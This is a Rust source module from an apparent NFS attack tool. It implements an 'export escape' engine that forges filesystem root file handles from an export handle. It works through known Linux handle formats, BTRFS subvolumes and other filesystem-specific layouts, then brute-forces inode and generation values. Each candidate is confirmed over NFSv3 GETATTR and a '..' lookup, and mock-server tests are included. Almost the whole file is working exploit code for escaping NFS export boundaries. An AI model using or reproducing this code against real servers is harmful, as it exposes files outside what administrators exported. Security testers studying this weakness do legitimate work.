//! Version-neutral NFS export escape engine.
//!
//! Constructs filesystem root handles from export handles to break out of
//! NFS export boundaries. Works through the `EscapeProbe` trait so the same
//! algorithm serves both the `escape` subcommand (Nfs3Client) and the
//! `escape-root` shell command (ShellOps).

use std::collections::HashSet;

use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, FsType};
use crate::proto::nfs3::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;

/// Probe interface for testing escape candidate handles.
///
/// Abstraction over the NFS version and transport so the escape algorithm
/// is version-neutral. Implemented by both the subcommand (wrapping Nfs3Client)
/// and the shell (wrapping ShellOps).
pub(crate) trait EscapeProbe: Send + Sync {
    /// GETATTR on a raw handle. Returns `Ok((is_directory, fileid))` or `Err`.
    /// On permission denied, the error message must contain "ACCES" or "PERM".
    fn probe_getattr(&self, handle: &[u8]) -> impl Future<Output = anyhow::Result<(bool, u64)>> + Send;

    /// LOOKUP a name in a directory. Returns the child handle bytes.
    fn probe_lookup(&self, dir: &[u8], name: &str) -> impl Future<Output = anyhow::Result<Vec<u8>>> + Send;
}

/// Configuration for the escape algorithm.
pub(crate) struct EscapeConfig {
    /// Number of BTRFS subvolume IDs to try (starting at 256).
    pub btrfs_subvols: u32,
    /// Maximum inode number to scan in the brute-force pass.
    pub max_root_scan: u32,
    /// Print progress lines to stderr.
    pub announce: bool,
}

impl Default for EscapeConfig {
    fn default() -> Self {
        Self { btrfs_subvols: 16, max_root_scan: 200, announce: true }
    }
}

/// Result of the escape attempt.
pub(crate) enum EscapeRootOutcome {
    /// Successfully constructed and verified a root handle.
    Success(EscapeResult),
    /// Handle format is valid (STALE hits) but root not found in scan range.
    StaleNoRoot,
    /// Server rejected handle format (BADHANDLE or non-Linux).
    Unsupported,
}

/// Run the full escape algorithm: known candidates -> BTRFS subvols -> ZFS -> brute-force.
///
/// This is the single entry point for the export-escape primitive. Both
/// `cli/escape.rs` (subcommand) and `shell/mod.rs` (`escape-root` command)
/// call this function through their respective `EscapeProbe` implementations.
pub(crate) async fn find_escape_root(probe: &(impl EscapeProbe + ?Sized), export_handle: &[u8], config: &EscapeConfig) -> EscapeRootOutcome {
    let fh = FileHandle::from_bytes(export_handle);

    // Get the export's own fileid for the identity check in probe_candidate().
    // If a constructed root handle resolves to the same fileid as the export,
    // it is the export itself (whole-filesystem export) and not an escape.
    //
    // Exception: when the seed has fileid_type=0 (MOUNT/LOOKUP root handle),
    // skip the fileid check. The escape constructs a fileid_type=1 handle for
    // the SAME root directory --the fileid will match but the handle bytes
    // differ. This is the desired behavior: converting a type-0 root handle
    // into a type-1 handle that can be further manipulated.
    let seed_fileid_type = export_handle.get(3).copied().unwrap_or(0);
    let export_fileid = if seed_fileid_type == 0 {
        None // type-0 root handle --fileid identity check would reject valid escapes
    } else {
        probe.probe_getattr(export_handle).await.ok().map(|(_, id)| id)
    };

    // Phase 1: INO32_GEN candidates (standard Linux handle format, various root inodes)
    let known = FileHandleAnalyzer::construct_root_candidates(&fh);
    for candidate in &known {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1b: BTRFS subvolume scan
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, config.btrfs_subvols);
    let mut announced: HashSet<u32> = HashSet::new();
    for candidate in &btrfs {
        if config.announce && announced.insert(candidate.inode_number) {
            tracing::debug!("Probing BTRFS subvol {} ...", candidate.inode_number);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1c: Filesystem-specific constructors (ZFS, EROFS, NILFS2, bcachefs, UDF, ISO9660)
    let fs_specific: Vec<EscapeResult> = [
        FileHandleAnalyzer::construct_zfs_root_handle(&fh),
        FileHandleAnalyzer::construct_erofs_root_handle(&fh, 36),
        FileHandleAnalyzer::construct_nilfs2_root_handles(&fh),
        FileHandleAnalyzer::construct_bcachefs_root_handle(&fh),
        FileHandleAnalyzer::construct_udf_root_candidates(&fh),
        FileHandleAnalyzer::construct_iso9660_root_candidates(&fh),
    ]
    .into_iter()
    .flatten()
    .collect();

    for candidate in &fs_specific {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 2: Brute-force scan.
    // 2a: inodes 1..6 with gen 0..5 (catches reiserfs gen=1, NTFS gen=5, etc.)
    // 2b: inodes 1..max_root_scan with gen=0 only (wider sweep, gen=0 covers most FSes)
    let mut found_stale = !known.is_empty() || !btrfs.is_empty();
    if found_stale && config.announce {
        tracing::debug!("Known candidates returned STALE -- brute-force scanning inodes 1..={}", config.max_root_scan);
    }

    // 2a: small inode range with gen sweep (6 * 6 = 36 probes, doubled for compound UUID)
    for inode in 1..=5 {
        for generation in 0..=5 {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, generation);
            for candidate in &candidates {
                if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                    return outcome;
                }
            }
        }
    }

    // 2b: wider inode range with gen=0 only
    for inode in 6..=config.max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, 0);
        for candidate in &candidates {
            if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                return outcome;
            }
        }
    }

    if found_stale { EscapeRootOutcome::StaleNoRoot } else { EscapeRootOutcome::Unsupported }
}

/// Run the full escape algorithm but collect ALL working root handles instead of
/// stopping at the first success.
///
/// Same phases as [`find_escape_root`] (known candidates, BTRFS subvols,
/// filesystem-specific constructors, brute-force scan) but every successful
/// candidate is pushed into the result vector. Deduplication by handle bytes
/// prevents the same root handle from appearing twice when different (inode, gen)
/// combinations produce the same on-wire handle.
pub(crate) async fn find_escape_root_all(probe: &(impl EscapeProbe + ?Sized), export_handle: &[u8], config: &EscapeConfig) -> Vec<EscapeResult> {
    let fh = FileHandle::from_bytes(export_handle);
    let seed_fileid_type = export_handle.get(3).copied().unwrap_or(0);
    let export_fileid = if seed_fileid_type == 0 { None } else { probe.probe_getattr(export_handle).await.ok().map(|(_, id)| id) };
    let mut results: Vec<EscapeResult> = Vec::new();
    let mut seen_handles: HashSet<Vec<u8>> = HashSet::new();

    // Helper closure-equivalent: record a candidate if it probes successfully
    // and we haven't seen this exact handle before.
    let mut try_record = |candidate: &EscapeResult, ok: bool| {
        if ok && seen_handles.insert(candidate.root_handle.as_bytes().to_vec()) {
            results.push(candidate.clone());
        }
    };

    // Phase 1: INO32_GEN candidates
    let known = FileHandleAnalyzer::construct_root_candidates(&fh);
    for candidate in &known {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 1b: BTRFS subvolume scan
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, config.btrfs_subvols);
    let mut announced: HashSet<u32> = HashSet::new();
    for candidate in &btrfs {
        if config.announce && announced.insert(candidate.inode_number) {
            tracing::debug!("Probing BTRFS subvol {} ...", candidate.inode_number);
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 1c: Filesystem-specific constructors
    let fs_specific: Vec<EscapeResult> = [
        FileHandleAnalyzer::construct_zfs_root_handle(&fh),
        FileHandleAnalyzer::construct_erofs_root_handle(&fh, 36),
        FileHandleAnalyzer::construct_nilfs2_root_handles(&fh),
        FileHandleAnalyzer::construct_bcachefs_root_handle(&fh),
        FileHandleAnalyzer::construct_udf_root_candidates(&fh),
        FileHandleAnalyzer::construct_iso9660_root_candidates(&fh),
    ]
    .into_iter()
    .flatten()
    .collect();

    for candidate in &fs_specific {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 2: Brute-force scan
    // 2a: small inode range with gen sweep
    for inode in 1..=5 {
        for generation in 0..=5 {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, generation);
            for candidate in &candidates {
                if let Some(result) = probe_brute_force_hit(probe, candidate, export_fileid, export_handle).await
                    && seen_handles.insert(result.root_handle.as_bytes().to_vec())
                {
                    results.push(result);
                }
            }
        }
    }

    // 2b: wider inode range with gen=0 only
    for inode in 6..=config.max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, 0);
        for candidate in &candidates {
            if let Some(result) = probe_brute_force_hit(probe, candidate, export_fileid, export_handle).await
                && seen_handles.insert(result.root_handle.as_bytes().to_vec())
            {
                results.push(result);
            }
        }
    }

    results
}

/// Like `probe_brute_force` but returns `Some(EscapeResult)` on success without
/// mutating any external state. Used by `find_escape_root_all` which does not
/// need the `found_stale` tracking.
async fn probe_brute_force_hit(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8]) -> Option<EscapeResult> {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((true, fileid)) => {
            if export_fileid.is_none_or(|exp| fileid != exp) && candidate.root_handle.as_bytes() != export_handle && is_root_dir(probe, candidate.root_handle.as_bytes(), fileid).await {
                return Some(candidate.clone());
            }
        },
        Ok((false, _)) => {},
        Err(e) => {
            let msg = format!("{e:#}");
            if is_acces(&msg) {
                return Some(candidate.clone());
            }
        },
    }
    None
}

/// Probe a brute-force candidate. Returns `Some(Success)` if the candidate is
/// confirmed as the filesystem root, `None` to continue scanning.
/// Updates `found_stale` when the handle format is accepted.
async fn probe_brute_force(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8], found_stale: &mut bool) -> Option<EscapeRootOutcome> {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((true, fileid)) => {
            if export_fileid.is_none_or(|exp| fileid != exp) && candidate.root_handle.as_bytes() != export_handle && is_root_dir(probe, candidate.root_handle.as_bytes(), fileid).await {
                return Some(EscapeRootOutcome::Success(candidate.clone()));
            }
            *found_stale = true;
        },
        Ok((false, _)) => {
            *found_stale = true;
        },
        Err(e) => {
            let msg = format!("{e:#}");
            if is_acces(&msg) || msg.contains("STALE") || msg.contains("stale") {
                *found_stale = true;
            }
        },
    }
    None
}

/// Test a single candidate handle against the probe.
async fn probe_candidate(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8]) -> bool {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((is_dir, fileid)) => {
            if !is_dir {
                return false;
            }
            // Handle bytes must differ from the export handle (identity check).
            if candidate.root_handle.as_bytes() == export_handle {
                return false;
            }
            // For non-BTRFS: a matching fileid means the constructed handle
            // resolves to the export's own root directory (whole-filesystem export).
            // BTRFS subvolumes share fileid 256, so we skip the fileid check.
            if candidate.fs_type != FsType::Btrfs && export_fileid.is_some_and(|exp| fileid == exp) {
                return false;
            }
            true
        },
        Err(e) => {
            let msg = format!("{e:#}");
            // ACCES/PERM = format accepted, root_squash blocks read.
            // The handle format is valid even though we cannot read attrs.
            is_acces(&msg)
        },
    }
}

/// Confirm a directory is the filesystem root: LOOKUP ".." must resolve back to self.
///
/// The filesystem root is its own parent (per POSIX), so `..` from the root
/// resolves to the root itself. A subdirectory has a different parent.
/// This also matches the NFSv4 pseudo-root, but that's acceptable -- the
/// escape engine prefers reporting more handles (including pseudo-root
/// matches) over missing real handles. Deduplication by handle bytes
/// prevents redundant output.
async fn is_root_dir(probe: &(impl EscapeProbe + ?Sized), handle: &[u8], self_fileid: u64) -> bool {
    let Ok(parent) = probe.probe_lookup(handle, "..").await else {
        return false;
    };
    let Ok((_, parent_fileid)) = probe.probe_getattr(&parent).await else {
        return false;
    };
    parent_fileid == self_fileid
}

/// Check if an error message indicates a permission denial.
fn is_acces(msg: &str) -> bool {
    msg.contains("ACCES") || msg.contains("PERM")
}

// --- Concrete EscapeProbe implementations ---

/// `EscapeProbe` wrapping a pooled NFSv3 client.
///
/// Used by the `escape` subcommand, the analyzer's `check_escape`, and
/// any other caller that has an `Nfs3Client` and wants to run the escape
/// algorithm. Defined here (next to the trait) so consumers don't each
/// need their own copy.
pub(crate) struct Nfs3EscapeProbe<'a> {
    pub client: &'a Nfs3Client,
}

impl EscapeProbe for Nfs3EscapeProbe<'_> {
    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
        let fh = FileHandle::from_bytes(handle);
        let attrs = self.client.attrs(&fh).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok((attrs.file_type == nfs_v3::FileType::Directory, attrs.fileid))
    }

    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
        let fh = FileHandle::from_bytes(dir);
        let (child, _) = self.client.resolve(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok(child.as_bytes().to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Mock probe: inode 2 with fileid_type=1 is a directory root,
    /// everything else returns STALE.
    struct MockProbe {
        accept_inode: u32,
    }

    impl EscapeProbe for MockProbe {
        async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
            anyhow::ensure!(handle.len() >= 8, "BADHANDLE");
            let fileid_type = handle.get(3).copied().unwrap_or(0);
            if fileid_type != 1 {
                anyhow::bail!("NFS3ERR_BADHANDLE");
            }
            // INO32_GEN: inode at bytes [fsid_len..fsid_len+4].
            // For fsid_type=7 (24-byte fsid): inode starts at byte 28.
            // For fsid_type=6 (16-byte fsid): inode starts at byte 20.
            // Simplified: scan for the 4-byte LE inode anywhere after the fsid.
            let fsid_type = handle.get(2).copied().unwrap_or(0);
            let fsid_len = match fsid_type {
                2 => 12,
                6 => 20,
                7 => 28,
                _ => 8,
            };
            let inode_offset = 4 + fsid_len;
            if handle.len() < inode_offset + 4 {
                anyhow::bail!("NFS3ERR_STALE");
            }
            assert!(handle.len() >= inode_offset + 4, "handle too short for inode");
            let inode = u32::from_le_bytes([handle[inode_offset], handle[inode_offset + 1], handle[inode_offset + 2], handle[inode_offset + 3]]);
            if inode == self.accept_inode {
                Ok((true, u64::from(inode)))
            } else {
                anyhow::bail!("NFS3ERR_STALE");
            }
        }

        async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
            if name == ".." || name == "etc" || name == "bin" || name == "usr" {
                return Ok(dir.to_vec());
            }
            anyhow::bail!("NFS3ERR_NOENT");
        }
    }

    #[tokio::test]
    async fn find_escape_root_succeeds_on_inode_2() {
        // Seed: fsid_type=7 (compound UUID, 28-byte fsid), fileid_type=0.
        let mut seed = vec![0x01, 0x00, 0x07, 0x00];
        seed.extend_from_slice(&[0; 24]); // 24-byte fsid

        let config = EscapeConfig { btrfs_subvols: 0, max_root_scan: 5, announce: false };
        // accept_inode=2: the INO32_GEN candidate with inode=2 should be tried
        let result = find_escape_root(&MockProbe { accept_inode: 2 }, &seed, &config).await;

        assert!(matches!(result, EscapeRootOutcome::Success(_)), "expected escape success");
    }

    #[tokio::test]
    async fn find_escape_root_unsupported_on_short_handle() {
        let seed = vec![0x01, 0x00]; // too short
        let config = EscapeConfig { btrfs_subvols: 0, max_root_scan: 3, announce: false };
        let result = find_escape_root(&MockProbe { accept_inode: 2 }, &seed, &config).await;
        assert!(matches!(result, EscapeRootOutcome::Unsupported));
    }

    #[test]
    fn is_acces_detects_permission_errors() {
        assert!(is_acces("NFS3ERR_ACCES"));
        assert!(is_acces("NFS3ERR_PERM"));
        assert!(is_acces("operation denied: ACCES"));
        assert!(!is_acces("NFS3ERR_STALE"));
        assert!(!is_acces("timeout"));
    }
}
